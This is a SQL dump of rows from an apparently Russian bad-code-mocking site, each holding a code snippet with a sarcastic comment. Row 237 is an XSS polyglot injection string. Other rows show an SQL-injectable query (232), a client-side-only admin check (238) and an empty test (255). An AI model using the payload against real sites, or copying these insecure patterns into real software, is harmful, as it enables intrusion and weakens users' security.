  (231,1734,9,1229786244,0,'private static final String PROMPT = \" >\";\r\nprivate static final int BUFFER_SIZE = 255;\r\nprivate static final int NEW_LINE_CHAR = 13;\r\nprivate static final int CARRIAGE_RETURN_CHAR = 10;\r\n...\r\nSystem.out.print( prompt + PROMPT );\r\nStringBuffer sb = new StringBuffer();\r\nbyte[] buf = new byte[BUFFER_SIZE];\r\nint read = System.in.read( buf );\r\nif ( read != 0 && buf[0] != CARRIAGE_RETURN_CHAR && buf[0] != NEW_LINE_CHAR )\r\n{\r\n    sb.append( new String( buf, 0, read ).trim() );\r\n}\r\nreturn sb.toString();','','Вам нужно вывести приглашение и прочитать введенную строку? Что может быть проще?',9,0,1,0),
  (232,1737,1,1229788028,1230019631,'elseif( $manufacturer_id) {\r\n\t\t$db->query( \"SELECT manufacturer_id, mf_name FROM #__{vm}_manufacturer WHERE manufacturer_id=''$manufacturer_id''\");\r\n\t\t$db->next_record();\r\n\t\t$mainframe->setPageTitle( $db->f(\"mf_name\") );\r\n\t\techo \"Izdeliya ot\";\r\n\t}','','',-6,0,0,2),
  (233,1739,1,1229794787,0,'if (gettype($x/2) == ''int'') { \r\n   $rowspan = $x - $i;                     \r\n} else { \r\n   $rowspan = ($x - $i) + 1; \r\n}','','Проверка на остаток от деления на 2 одним начинающим знакомым ПХП программистом',30,0,1,5),
  (234,1741,10,1229799314,0,'for J1:=0 to Length(wArTypCoil[JJ])-1 do begin\r\n      with wArTypCoil[JJ][J1] do begin\r\n       with cTyp_coil do begin NRow:=J1+1;NTab:=II_Tabl+4; Itm5:=II;StrN:=2230;mEd:=true;Lev:=2;end;P5;ArP5[IJ5]:=@cTyp_coil;inc(IJ5);inc(II);\r\n       with cD_in do begin NRow:=J1+1;NTab:=II_Tabl+4; Itm1:=II; StrN:=2231;mEd:=true;NPos:=1;Lev:=2;end;P1;ArP1[IJ1]:=@cD_in;inc(IJ1);inc(II);\r\n       with cTyp_pr do begin NRow:=J1+1;NTab:=II_Tabl+4; Itm6:=II;NTypChs1:=1;StrN:=2232;mEd:=true;Lev:=2;end;P6;ArP6[IJ6]:=@cTyp_Pr;inc(IJ6);inc(II);\r\n       with cRad_str do begin NRow:=J1+1;NTab:=II_Tabl+4; Itm5:=II; StrN:=2233;mEd:=true;Lev:=2;end;P5;ArP5[IJ5]:=@cRad_str;inc(IJ5);inc(II);\r\n       with cPW_coil_rad do begin NRow:=J1+1;NTab:=II_Tabl+4; Itm2:=II; StrN:=2235;mEd:=true;Lev:=2;end;P2;ArP2[IJ2]:=@cPW_coil_rad;inc(IJ2);inc(II);\r\n       with cPW_coil_os do begin NRow:=J1+1;NTab:=II_Tabl+4; Itm2:=II; StrN:=2248;mEd:=true;Lev:=2;end;P2;ArP2[IJ2]:=@cPW_coil_os;inc(IJ2);inc(II);\r\n       with cRat_cur do begin NRow:=J1+1;NTab:=II_Tabl+4; Itm1:=II; StrN:=2236;mEd:=true;NPos:=2;Lev:=2;end;P1;ArP1[IJ1]:=@cRat_cur;inc(IJ1);inc(II);\r\n       with cTrn_coil do begin NRow:=J1+1;NTab:=II_Tabl+4; Itm1:=II; StrN:=2237;mEd:=true;NPos:=3;Lev:=2;end;P1;ArP1[IJ1]:=@cTrn_coil;inc(IJ1);inc(II);\r\n       with cRad_dim do begin NRow:=J1+1;NTab:=II_Tabl+4; Itm1:=II; StrN:=2271;mEd:=true;NPos:=3;Lev:=2;end;P1;ArP1[IJ1]:=@cRad_dim;inc(IJ1);inc(II);\r\n       //...\r\n      end;\r\n     end;\r\n     with wArNconcentr[JJ] do begin NRow:=1;NTab:=II_Tabl+1; Itm2:=II; StrN:=2279;mEd:=false;Lev:=1;end;P2;ArP2[IJ2]:=@wArNconcentr[JJ];inc(IJ2);inc(II);\r\n     with wArM_c[JJ] do begin NRow:=1;NTab:=II_Tabl+1; Itm3:=II; StrN:=2316;mEd:=true;NPos:=0;Lev:=1;end;P3;ArP3[IJ3]:=@wArM_c[JJ];inc(IJ3);inc(II);\r\n //    with wArNumZoneOtvod_c[JJ] do begin NTab:=II_Tabl+1; Itm3:=II; StrN:=2317;mEd:=true;NPos:=0;Lev:=1;end;P3;ArP3[IJ3]:=@wArNumZoneOtvod_c[JJ];inc(IJ3);inc(II);\r\n //    with wArNumZoneVdod_c[JJ] do begin NTab:=II_Tabl+1; Itm3:=II; StrN:=2318;mEd:=true;NPos:=0;Lev:=1;end;P3;ArP3[IJ3]:=@wArNumZoneVdod_c[JJ];inc(IJ3);inc(II);\r\n //    with wArNxod_c[JJ] do begin NTab:=II_Tabl+1; Itm3:=II; StrN:=2319;mEd:=true;NPos:=0;Lev:=1;end;P3;ArP3[IJ3]:=@wArNxod_c[JJ];inc(IJ3);inc(II);\r\n //    with wArNcur_c[JJ] do begin NTab:=II_Tabl+1; Itm3:=II; StrN:=2320;mEd:=true;NPos:=0;Lev:=1;end;P3;ArP3[IJ3]:=@wArNcur_c[JJ];inc(IJ3);inc(II);\r\n //    with wArParam_c[JJ] do begin NTab:=II_Tabl+1; Itm3:=II; StrN:=2321;mEd:=true;NPos:=0;Lev:=1;end;P3;ArP3[IJ3]:=@wArParam_c[JJ];inc(IJ3);inc(II);\r\n //    with wArSw_c[JJ] do begin NTab:=II_Tabl+1; Itm3:=II; StrN:=2322;mEd:=true;NPos:=1;Lev:=1;end;P3;ArP3[IJ3]:=@wArSw_c[JJ];inc(IJ3);inc(II);\r\n     with wArNumKolc_top_c[JJ] do begin NRow:=1;NTab:=II_Tabl+1; ; Itm3:=II; StrN:=2328;mEd:=true;NPos:=0;Lev:=1;end;P3;ArP3[IJ3]:=@wArNumKolc_top_c[JJ];inc(IJ3);inc(II);\r\n     with wArNumKolc_bot_c[JJ] do begin NRow:=1;NTab:=II_Tabl+1; Itm3:=II; StrN:=2329;mEd:=true;NPos:=0;Lev:=1;end;P3;ArP3[IJ3]:=@wArNumKolc_bot_c[JJ];inc(IJ3);inc(II);\r\n     with wArNreek_ar[JJ] do begin NRow:=1;NTab:=II_Tabl+3; Itm3:=II; StrN:=2313;mEd:=true;NPos:=0;Lev:=1;end;P3;ArP3[IJ3]:=@wArNreek_ar[JJ];inc(IJ3);inc(II);\r\n     with wArGshreik_ar[JJ] do begin NRow:=1;NTab:=II_Tabl+3; Itm3:=II; StrN:=2314;mEd:=true;NPos:=2;Lev:=1;end;P3;ArP3[IJ3]:=@wArGshreik_ar[JJ];inc(IJ3);inc(II);\r\n     with wArGtreik_ar[JJ] do begin NRow:=1;NTab:=II_Tabl+3; Itm3:=II; StrN:=2315;mEd:=true;NPos:=2;Lev:=1;end;P3;ArP3[IJ3]:=@wArGtreik_ar[JJ];inc(IJ3);inc(II);\r\n     with wArShreik_ar[JJ] do begin NRow:=1;NTab:=II_Tabl+3; Itm3:=II; StrN:=2404;mEd:=true;NPos:=2;Lev:=1;end;P3;ArP3[IJ3]:=@wArShreik_ar[JJ];inc(IJ3);inc(II);\r\n     with wArNpr[JJ] do begin NRow:=1;NTab:=II_Tabl+3; Itm2:=II; StrN:=2369;mEd:=true;Lev:=1;end;P2;ArP2[IJ2]:=@wArNpr[JJ];inc(IJ2);inc(II);\r\n     with wArShpr[JJ] do begin NRow:=1;NTab:=II_Tabl+3; Itm1:=II; StrN:=2245;mEd:=true;NPos:=2;Lev:=1;end;P1;ArP1[IJ1]:=@wArShpr[JJ];inc(IJ1);inc(II);\r\n\r\n     with wArRadZaz_w[JJ] do begin NRow:=1;NTab:=II_Tabl+1; Itm3:=II; StrN:=2323;mEd:=true;NPos:=2;Lev:=1;end;P3;ArP3[IJ3]:=@wArRadZaz_w[JJ];inc(IJ3);inc(II);\r\n     with wArStr_os_w[JJ] do begin NRow:=1;NTab:=II_Tabl+1; Itm1:=II; StrN:=2324;mEd:=true;NPos:=2;Lev:=1;end;P1;ArP1[IJ1]:=@wArStr_os_w[JJ];inc(IJ1);inc(II);\r\n     with wArPrizn_radop_w[JJ] do begin NRow:=1;NTab:=II_Tabl+1; Itm4:=II;NTypChs:=0;StrN:=2325;mEd:=true;Lev:=1;end;P4;ArP4[IJ4]:=@wArPrizn_radop_w[JJ];inc(IJ4);inc(II);\r\n\r\n     with wArAxStr[JJ].awAxialStr do begin NRow:=1;NTab:=II_Tabl+5; Itm5:=II; StrN:=2243;mEd:=true;Lev:=1;end;P5;ArP5[IJ5]:=@wArAxStr[JJ].awAxialStr;inc(IJ5);inc(II);\r\n     with wArYokeRast_bot_w[JJ] do begin NRow:=1;NTab:=II_Tabl+2; Itm1:=II; StrN:=2265;mEd:=true;NPos:=2;Lev:=1;end;P1;ArP1[IJ1]:=@wArYokeRast_bot_w[JJ];inc(IJ1);inc(II);\r\n     with wArElectrH_w[JJ] do begin NRow:=1;NTab:=II_Tabl+2; Itm1:=II; StrN:=2266;mEd:=true;NPos:=2;Lev:=1;end;P1;ArP1[IJ1]:=@wArElectrH_w[JJ];inc(IJ1);inc(II);\r\n     with wArElectr_centre[JJ] do begin NRow:=1;NTab:=II_Tabl+2; Itm1:=II; StrN:=2395;mEd:=false;NPos:=1;Lev:=1;end;P1;ArP1[IJ1]:=@wArElectr_centre[JJ];inc(IJ1);inc(II);\r\n     with wArKanBottom[JJ] do begin NRow:=1;NTab:=II_Tabl+2; Itm3:=II; StrN:=2341;mEd:=true;NPos:=2;Lev:=1;end;P3;ArP3[IJ3]:=@wArKanBottom[JJ];inc(IJ3);inc(II);\r\n     with wArKanTop[JJ] do begin NRow:=1;NTab:=II_Tabl+2; Itm3:=II; StrN:=2342;mEd:=true;NPos:=2;Lev:=1;end;P3;ArP3[IJ3]:=@wArKanTop[JJ];inc(IJ3);inc(II);\r\n\r\n     with wArComIsZone[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm1:=II; StrN:=2339;mEd:=true;NPos:=2;Lev:=1;end;P1;ArP1[IJ1]:=@wArComIsZone[JJ];inc(IJ1);inc(II);\r\n     with wArMprIsZone[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm1:=II; StrN:=2340;mEd:=true;NPos:=2;Lev:=1;end;P1;ArP1[IJ1]:=@wArMprIsZone[JJ];inc(IJ1);inc(II);\r\n     with wArKus_pr[JJ] do begin NRow:=1;NTab:=II_Tabl+7; Itm1:=II; StrN:=2249;mEd:=true;NPos:=3;Lev:=1;end;P1;ArP1[IJ1]:=@wArKus_pr[JJ];inc(IJ1);inc(II);\r\n     with wArKus_bm_is[JJ] do begin NRow:=1;NTab:=II_Tabl+7; Itm1:=II; StrN:=2250;mEd:=true;NPos:=3;Lev:=1;end;P1;ArP1[IJ1]:=@wArKus_bm_is[JJ];inc(IJ1);inc(II);\r\n     with wArKus_ob_is[JJ] do begin NRow:=1;NTab:=II_Tabl+7; Itm1:=II; StrN:=2251;mEd:=true;NPos:=3;Lev:=1;end;P1;ArP1[IJ1]:=@wArKus_ob_is[JJ];inc(IJ1);inc(II);\r\n     with wArKus_mpr_is[JJ] do begin NRow:=1;NTab:=II_Tabl+7; Itm1:=II; StrN:=2252;mEd:=true;NPos:=3;Lev:=1;end;P1;ArP1[IJ1]:=@wArKus_mpr_is[JJ];inc(IJ1);inc(II);\r\n //    with wArKus_msl_is[JJ] do begin NRow:=1;NTab:=II_Tabl+7; Itm1:=II; StrN:=2253;mEd:=true;NPos:=3;Lev:=1;end;P1;ArP1[IJ1]:=@wArKus_msl_is[JJ];inc(IJ1);inc(II);\r\n     with wArTypIsol[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm6:=II;NTypChs1:=2;StrN:=2254;mEd:=true;Lev:=1;end;P6;ArP6[IJ6]:=@wArTypIsol[JJ];inc(IJ6);inc(II);\r\n\r\n     with wArEndIsol_bot[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm3:=II; StrN:=2258;mEd:=true;NPos:=1;Lev:=1;end;P3;ArP3[IJ3]:=@wArEndIsol_bot[JJ];inc(IJ3);inc(II);\r\n     with wArEndIsol_top[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm3:=II; StrN:=2259;mEd:=true;NPos:=1;Lev:=1;end;P3;ArP3[IJ3]:=@wArEndIsol_top[JJ];inc(IJ3);inc(II);\r\n     with wArTypMat_end_top_w[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm6:=II;NTypChs1:=3;StrN:=2326;mEd:=true;Lev:=1;end;P6;ArP6[IJ6]:=@wArTypMat_end_top_w[JJ];inc(IJ6);inc(II);\r\n     with wArTypMat_end_bot_w[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm6:=II;NTypChs1:=3;StrN:=2327;mEd:=true;Lev:=1;end;P6;ArP6[IJ6]:=@wArTypMat_end_bot_w[JJ];inc(IJ6);inc(II);\r\n     with wArNst_top_isol[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm3:=II; StrN:=2332;mEd:=true;NPos:=0;Lev:=1;end;P3;ArP3[IJ3]:=@wArNst_top_isol[JJ];inc(IJ3);inc(II);\r\n     with wArNst_bot_isol[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm3:=II; StrN:=2333;mEd:=true;NPos:=0;Lev:=1;end;P3;ArP3[IJ3]:=@wArNst_bot_isol[JJ];inc(IJ3);inc(II);\r\n     with wArSh_top_isol[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm3:=II; StrN:=2334;mEd:=true;NPos:=2;Lev:=1;end;P3;ArP3[IJ3]:=@wArSh_top_isol[JJ];inc(IJ3);inc(II);\r\n     with wArSh_bot_isol[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm3:=II; StrN:=2335;mEd:=true;NPos:=2;Lev:=1;end;P3;ArP3[IJ3]:=@wArSh_bot_isol[JJ];inc(IJ3);inc(II);\r\n     with wArRad_top_isol[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm3:=II; StrN:=2336;mEd:=true;NPos:=2;Lev:=1;end;P3;ArP3[IJ3]:=@wArRad_top_isol[JJ];inc(IJ3);inc(II);\r\n     with wArRad_bot_isol[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm3:=II; StrN:=2337;mEd:=true;NPos:=2;Lev:=1;end;P3;ArP3[IJ3]:=@wArRad_bot_isol[JJ];inc(IJ3);inc(II);\r\n\r\n //    with wArPriznZakr[JJ] do begin NRow:=1;NTab:=II_Tabl+6; Itm3:=II; StrN:=2338;mEd:=true;NPos:=0;Lev:=1;end;P3;ArP3[IJ3]:=@wArPriznZakr[JJ];inc(IJ3);inc(II);\r\n     //....\r\n    end;','','Просто говно. Кусок одного из вложенных циклов',28,0,1,7),
  (235,1743,7,1229807384,0,'flag = bool(int(flag) - 1);','','',33,0,1,3),
  (236,1745,11,1229811547,0,'do {\r\n\r\n\tt_year++;\r\n\r\n\tLength_periods[i]++;\r\n\r\n\r\n} while (t_year<=Periods_end);','','А вам слабо!?',19,0,1,0),
  (237,1749,8,1229840339,1229908237,''';alert(0)//\\'';alert(1)//\";alert(2)//\\\";alert(3)//--></SCRIPT>\"\">''><SCRIPT>alert(4)</SCRIPT>=&{}\"\");}alert(6);function xss(){//\"','',''';alert(0)//\\'';alert(1)//\";alert(2)//\\\";alert(3)//--></SCRIPT>\"\">''><SCRIPT>alert(4)</SCRIPT>=&{}\"\");}alert(6);function xss(){//\"',-17,0,0,3),
  (238,1751,1,1229854178,0,'<?\r\nif ($_SESSION[''UsersPermission''] != ''admin'') {?>\r\n    <script type = \"text/javascript\">\r\n        location.href = \"index.php\";\r\n    </script>\r\n<?}','','Мега безопасная проверка на права админа',45,0,1,6),
  (240,1772,8,1229948485,0,'public void Discard(Answer answer)\r\n        {\r\n            RecordedAnswer discardedAnswer = null;\r\n            foreach (RecordedAnswer recodedAnswer in m_recodedAnswers)\r\n            {\r\n                if (object.ReferenceEquals(recodedAnswer, answer))\r\n                {\r\n                    discardedAnswer = recodedAnswer;\r\n                    break;\r\n                }\r\n            }\r\n            if (null != discardedAnswer)\r\n            {\r\n                m_recodedAnswers.Remove(discardedAnswer);\r\n            }\r\n        }','','Прикол в том, что Answer и RecordedAnswer есть разные классы, никак  не связанные наследованием, оба отнаследованы от Object',4,0,1,0),
  (241,1775,8,1229958791,0,'if (e.PosChanged != PosChanged.Moved)\r\n{\r\n      if (e.PosChanged == PosChanged.Sized && e.ColumnHeaders[0].Column.Key == Column.SelectedColumnName)\r\n      {\r\n              return;\r\n      }\r\n\r\n      return;\r\n}\r\nstring key = e.ColumnHeaders[0].Column.Key;\r\n//....','','',2,0,1,0),
  (242,1777,1,1229962710,0,'public function logout()\r\n\r\n    {\r\n\r\n        $_SESSION = array();\r\n\r\n        session_unset();\r\n\r\n        session_destroy();\r\n\r\n        setcookie(\"username\", \"\", time() - 3600, \"/\", ''.''.BASE_HTTP_HOST);\r\n\r\n        setcookie(\"password\", \"\", time() - 3600, \"/\", ''.''.BASE_HTTP_HOST);\r\n\r\n    }','','Это чтоб уж наверняка, стереть сессию, так стереть...',14,0,1,3),
  (243,1779,10,1229965133,0,'for i:=1 to n do\r\nbegin\r\n    j:=i;\r\n    a:=b*exp((j-1)*ln(r));\r\nend;','','Задание геометрической прогрессии. Из решения школьной задачки.',12,0,1,2),
  (244,1781,8,1229975893,1230175203,'this.sector = this.neo.MoveTo(gameTime, out startLive, out steps);                \r\n\r\nif (!FP)\r\n{\r\n    //stepCnt += steps;\r\n    showCard = true;\r\n    FP = true;\r\n}\r\n\r\n// БЫЛО: bool[] btnCard = this.cm.GetCard(stepCnt, out card, this.neo);\r\n// СТАЛО:\r\nbool[] btnCard = this.cm.GetCard(neo.Cursector, out card, this.neo);\r\n\r\n// ...  НО ИЗЗА ТАКИХ МЕСТ В КОДЕ ЭТО ПИЗДЕЦ КАК СЛОЖНО!\r\nif (this.card == null)\r\n{\r\n    //stepCnt -= 29;\r\n    //btnCard = this.cm.GetCard(stepCnt, out card, this.neo);\r\n    btnCard = this.cm.GetCard(neo.Cursector, out card, this.neo);\r\n}','','',-3,0,0,0),
  (245,1783,6,1229976836,0,'printf(\"%c%c%c%c\",a,*(&a+1),*(&a+2),*(&a+3));','','выводим long int побайтово в бинарном виде :)',4,0,1,4),
  (246,1785,2,1229985774,0,'if (auth_exit_callback != undefined)\r\n{\r\n   auth_exit_callback = undefined;\r\n   auth_exit_callback();\r\n}','','Вызов колбэка и обнуление ссылки на него',24,0,1,0),
  (247,1791,7,1230013461,0,'switch (*p)\r\n         {\r\n            case ''0'': id += 0; break;\r\n            case ''1'': id += 1; break;\r\n            case ''2'': id += 2; break;\r\n            case ''3'': id += 3; break;\r\n            case ''4'': id += 4; break;\r\n            case ''5'': id += 5; break;\r\n            case ''6'': id += 6; break;\r\n            case ''7'': id += 7; break;\r\n            case ''8'': id += 8; break;\r\n            case ''9'': id += 9; break;\r\n            case ''a'': case ''A'': id += 10; break;\r\n            case ''b'': case ''B'': id += 11; break;\r\n            case ''c'': case ''C'': id += 12; break;\r\n            case ''d'': case ''D'': id += 13; break;\r\n            case ''e'': case ''E'': id += 14; break;\r\n            case ''f'': case ''F'': id += 15; break;\r\n            case ''g'': case ''G'': id += 16; break;\r\n            case ''h'': case ''H'': id += 17; break;\r\n            case ''i'': case ''I'': id += 18; break;\r\n            case ''j'': case ''J'': id += 19; break;\r\n            case ''k'': case ''K'': id += 20; break;\r\n            case ''l'': case ''L'': id += 21; break;\r\n            case ''m'': case ''M'': id += 22; break;\r\n            case ''n'': case ''N'': id += 23; break;\r\n            case ''o'': case ''O'': id += 24; break;\r\n            case ''p'': case ''P'': id += 25; break;\r\n            case ''q'': case ''Q'': id += 26; break;\r\n            case ''r'': case ''R'': id += 27; break;\r\n            case ''s'': case ''S'': id += 28; break;\r\n            case ''t'': case ''T'': id += 29; break;\r\n            case ''u'': case ''U'': id += 30; break;\r\n            case ''v'': case ''V'': id += 31; break;\r\n            case ''w'': case ''W'': id += 32; break;\r\n            case ''x'': case ''X'': id += 33; break;\r\n            case ''y'': case ''Y'': id += 34; break;\r\n            case ''z'': case ''Z'': id += 35; break;\r\n         }','','считаем нечто типа хэша. захотим изменить алгоритм, сделав вместо сложения - ксор, будем фаница реплейсом.\r\nисточник http://www.winsim.com/diskid32/diskid32.cpp\r\nтам же красивые переменные int ijk = 0;',18,0,1,1),
  (248,1794,7,1230023287,0,'void SimplexIteration::ReWidth()\r\n{  w[-2]=w[0]=Width; w[-1]=5; for(size_t j=1;j<A.size_j();j++) w[j]=Width;\r\n   if (var) for(size_t j=1; j<A.size_j(); j++)\r\n               if(strlen(var[j])>w[j]) w[j]=strlen(var[j]);\r\n}','','Особенно порадовало w[-2]. Знаю, что так можно, но все равно говнисто.',11,0,1,0),
  (249,1797,9,1230026693,0,'StringBuffer url = new StringBuffer( HTTPS + module + TAGS + tag + SLESH );','','',24,0,1,0),
  (250,1800,1,1230033541,0,'$params = array (\r\n        ''host''     => $cfgMessageDb->host,\r\n        ''username'' => $cfgMessageDb->username,\r\n        ''password'' => $cfgMessageDb->password,\r\n        ''dbname''   => $cfgMessageDb->name,\r\n        ''persistent'' => ( defined(\"USE_PERSISTENT_CONNECTION\") && USE_PERSISTENT_CONNECTION ) ? true : false\r\n    );','6','И вот таких кусков дохренища.',3,0,1,9),
  (251,1809,8,1230045851,0,'Nullable<float> r = p.Intersects( b );\r\n\r\n            if( r.HasValue)\r\n            {\r\n                c = Color.BlueViolet;\r\n            }','','',1,0,1,4),
  (252,1817,1,1230049773,1230122262,'--------CSS----------\r\n.window {\r\n\tposition:fixed;\r\n\theight:300px;\r\n\twidth:300px;\r\n\tbackground: #FCFDCC;\r\n}\r\n.window .wlt {\r\n\tfloat: left;\r\n\theight:15px;\r\n\twidth:11px;\r\n\tbackground: url(\"design/wlt.gif\");\r\n}\r\n.window .wrt {\r\n\tfloat: right;\r\n\theight:15px;\r\n\twidth:11px;\r\n\tbackground: url(\"design/wrt.gif\");\r\n}\r\n.window .wct {\r\n\theight:15px;\r\n\twidth: 100%;\r\n\tbackground: url(\"design/wct.gif\");\r\n}\r\n\r\n.window .content {\r\n\tfloat: left;\r\n}\r\n--------HTML--------------------\r\n<div class=\"window\">\r\n <div class=\"wlt\"></div>\r\n <div class=\"wrt\"></div>\r\n <div class=\"wct\"></div>\r\n</div>','','Как заставить этот код работать в ИЕ7?',-15,0,0,1),
  (253,1832,13,1230054379,0,'set root=D:\\work\\\r\nset batch=D:\\batch\r\nset default=mfs\r\nset svncmd=svn\r\nset revert=revert\r\nset config=WebUI\\Web.config\r\nset phpfile=wc.php\r\nset start=start /b /wait\r\nset rerun=rerun.cmd\r\nset build=build.cmd\r\n\r\nif  \"%2\"==\"\" (set where=%batch%\\svn.txt) else (set where=\"%2\")\r\nif \"%1\"==\"commit\" (set o=-F %batch%\\svnlog.log)\r\nif \"%1\"==\"commit\" (set m=-m \"%3\")\r\n\r\nprompt $G\r\ncolor 1f\r\ncls\r\n\r\nfor /f %%s in (%where%) do (\r\n\ttitle %1 %%s\r\n\techo ===============================================================================\r\n\techo %1 %%s\r\n\tif \"%%s\"==\"%default%\" (\r\n\t\t%svncmd% %revert% %root%%%s\\%config% >> nul\r\n\t\t%svncmd% %1 %o% %m% %root%%%s\r\n\t\t%phpfile% %root%%%s\\%config%\r\n\t\tpause\r\n\t\ttitle build %%s\r\n\t\t%build% %%s /b\r\n\t\ttitle rerun %%s\r\n\t\t%rerun% %%s /b\r\n\t) else (\r\n\t\t%svncmd% %1 %o% %m% %root%%%s\r\n\t\tpause\r\n\t)\r\n\ttitle %1 %%s - done!\r\n)\r\nexit','','batch-скрипт под windows, делает апдейт/коммит в SVN.\r\nДемонстрация неразделённой любви к переменным в батниках.\r\n\r\n~anmiles~\r\n',11,0,1,0),
  (254,1838,1,1230075562,0,'if ( 0 == 0 ) \r\n{ \r\n  $x += 1; \r\n  $yellow = \"\"; \r\n  if ( $myhighlight_unit[$i_high] == $row[$i][''ID''] ) \r\n  { \r\n    //echo $myhighlight_unit[$i_high].\" == \".$i_high.\"<br />\";   \r\n    $yellow = \"background-color: #ffcc33;\"; \r\n  } \r\n  if ( $row[$i][''approved''] > 0 && $_SESSION[''userid''] > 3 ) \r\n  { \r\n    $yellow = \"background-color: #ff0000;\"; \r\n  } \r\n  if ( $i_tr == 0 ) \r\n  { \r\n    echo \"<tr>\"; \r\n  }\r\n}','','Очередной шедевр от автора #66, #68 и #69',12,0,1,6),
  (255,1844,8,1230081433,0,'[Test]\r\npublic void UserHasNoPermissionToDeleteTransactionWithEditPermission()\r\n{\r\n  var user = CreatetestUser(\"test\")\r\n    .WithPermissions()\r\n    .Allow(\"Transaction/Edit\").Do();\r\n  TestCurrentUser = user;\r\n\r\n  var trn = CreateTestTransaction(120, typeof(CreditCardPayment));\r\n\r\n  try\r\n  {    \r\n    // Who cares about delete, we never do it.\r\n    // I need this test passed just NOW.\r\n\r\n    // trn.AsIObject().Delete();\r\n    // Assert.Fail(\"Exception expected\");\r\n  }\r\n  catch (PermissionException ex)\r\n  {\r\n    Assert.IsTrue(true, \"Cool we got an exception\");\r\n  }\r\n  catch (Exception generic)\r\n  {\r\n    Assert.Fail(\"PermissionException expected.\");\r\n  }\r\n}','','Ничего не тестирующий тест',5,0,1,1),
  (256,1846,10,1230098007,0,'function find7(S:string):integer;\r\nvar\r\nMyArray : TStringList;\r\nn,i,sum, Resultat : integer;\r\nMyInt : String;\r\nbegin\r\nMyArray := TStringList.Create;\r\nTrim(S); n:= 0;\r\nwhile(Length(s)>0) do begin\r\nTrim(S);\r\nif(Pos('' '',S)=0) then begin\r\nMyArray.Insert(n,Copy(S,1,Length(S)));\r\nbreak;\r\nend else begin\r\n  if(Copy(S,1,Pos('' '',S))='' '') then begin\r\n  Delete(S,1,(Pos('' '',S)));\r\n  end else begin\r\n    MyArray.Insert(n,Copy(S,1,Pos('' '',S)));\r\n    Delete(S,1,(Pos('' '',S)));\r\n    n:=n+1;\r\n    end;\r\nend;\r\nend;\r\n  Resultat := 0;\r\n  for i := 0 to MyArray.Count-1 do begin\r\n    MyInt := MyArray.Strings[i]; Sum := 0;\r\n    for n := 1 to Length(MyInt) do begin\r\n      if(MyInt[n]=''7'') then Sum := Sum + 1;\r\n    end;\r\n    if(Sum>=2) then Resultat := Resultat + 1;\r\n  end;\r\n  Result := Resultat;\r\nend;','','Жуть...',8,0,1,0),
  (257,1848,1,1230099425,1230148116,'|^^^^^^^^^^^|______ ПРАЗДНИК\r\n|_____ПИВО_____|'',''''''|''''''''''''''''''\\____,, К НАМ\r\n|_______________| _|''____|____| ПРИХОДИТ\r\n*''(@)''(@)''''''''''''''|(@)(@)******|(@)*\r\n\r\n|^^^^^^^^^^^|______ ПРАЗДНИК\r\n|_____ДЖИН____ |'',''''''|''''''''''''''''''\\____,, К НАМ\r\n|_______________| _|''____|____| ПРИХОДИТ\r\n*''(@)''(@)''''''''''''''|(@)(@)******|(@)*\r\n\r\n|^^^^^^^^^^^|______ ПРАЗДНИК\r\n|____ВИСКИ_____|'',''''''|''''''''''''''''''\\____,, К НАМ\r\n|_______________| _|''____|____| ПРИХОДИТ\r\n*''(@)''(@)''''''''''''''|(@)(@)******|(@)*\r\n\r\n|^^^^^^^^^^^|______ ПРАЗДНИК\r\n|____ВОДКА_____|'',''''''|''''''''''''''''''\\____,, К НАМ\r\n|_______________| _|''____|____| ПРИХОДИТ\r\n*''(@)''(@)''''''''''''''|(@)(@)******|(@)*\r\n\r\n|^^^^^^^^^^^|______ ПРАЗДНИК\r\n|____КОНЬЯК___ |'',''''''|''''''''''''''''''\\____,, К НАМ\r\n|_______________| _|''____|____| ПРИХОДИТ\r\n*''(@)''(@)''''''''''''''|(@)(@)******|(@)*\r\n\r\n|^^^^^^^^^^^|______ ПРАЗДНИК\r\n|___ТЕКИЛКА____|'',''''''|''''''''''''''''''\\____,, К НАМ\r\n|_______________| _|''____|____| ПРИХОДИТ\r\n*''(@)''(@)''''''''''''''|(@)(@)******|(@)*\r\n\r\n|^^^^^^^^^^^|______ ПРАЗДНИК\r\n|___САМБУКА___ |'',''''''|''''''''''''''''''\\____,, К НАМ\r\n|_______________| _|''____|____| ПРИХОДИТ\r\n*''(@)''(@)''''''''''''''|(@)(@)******|(@)*\r\n\r\n|^^^^^^^^^^^|______ ПРАЗДНИК\r\n|____АБСЕНТ____|'',''''''|''''''''''''''''''\\____,, К НАМ\r\n|_______________| _|''____|____| ПРИХОДИТ\r\n*''(@)''(@)''''''''''''''|(@)(@)******|(@)*\r\n\r\n|^^^^^^^^^^^|______ ПРАЗДНИК\r\n|_ВСЕ ПОДРЯД___|'',''''''|''''''''''''''''''\\____,, МЫ\r\n|_______________| _|''____|____| НЕ ПОМНИМ=)\r\n*''(@)''(@)''''''''''''''|(@)(@)******|(@)*','','С новым годом . Все наверно видели рекламу кока-колы :) Это римейк на тему кризиса.',-19,0,0,0),
  (258,1850,2,1230106352,0,'function showThisDamnDiv(damnDiv,damnImage) {\r\nvar name = navigator.appName; \r\nif (name == \"Microsoft Internet Explorer\") {  // тваюмать\r\n...','','',49,0,1,4),
